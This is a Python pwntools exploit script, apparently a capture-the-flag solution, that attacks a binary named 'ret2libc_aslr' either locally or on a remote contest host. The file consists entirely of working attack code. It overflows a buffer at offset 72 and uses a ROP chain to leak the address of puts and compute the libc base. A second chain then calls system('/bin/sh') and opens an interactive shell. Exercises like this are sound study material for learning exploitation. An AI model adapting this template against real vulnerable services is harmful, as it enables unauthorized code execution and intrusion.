#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_aslr', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
#addresses
POP_RDI  =   0x00000000004011ff
RET      =   0x000000000040101a
PUTS_GOT =   elf.got['puts']
PUTS_PLT =   elf.plt['puts']
MAIN     =   elf.sym['main']
#/bin/sh & system are searched later once we find libc base address

OFFSET = 72 #found with cyclic 200 

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
            pause()
    else:
        global libc
        libc = ELF('./libc.so.6', checksec=False)
        r = remote('offsec.m0lecon.it',13533)
    
    return r

def main():
    #Phase 1: discover the libc address
    p = conn()
    p.recvuntil(b'wish: ')
    payload1 = flat(
        b'A'*OFFSET,
        p64(POP_RDI),
        p64(PUTS_GOT),
        p64(PUTS_PLT),
        p64(MAIN),
    )
    p.sendline(payload1)
    log.info("Payload sent...")
    p.recvline() #consume "The start ..."
    
    leaked = p.recvline().strip()
    leak_puts = u64(leaked.ljust(8, b'\x00'))
    log.info(f"puts leak = {leak_puts:#x}")

    libc.address = leak_puts - libc.symbols['puts']
    log.info(f"libc base address = {libc.address:#x}")

    #Phase2: execute system('/bin/sh')
    system_addr = libc.symbols['system']
    BINSH = next(libc.search('/bin/sh\x00')) 

    payload2 = flat(
        b'A'*OFFSET,
        p64(RET),
        p64(POP_RDI),
        p64(BINSH),
        p64(system_addr)
    )

    p.recvuntil(b'wish: ')
    p.sendline(payload2)

    p.interactive()


if __name__=="__main__":
    main()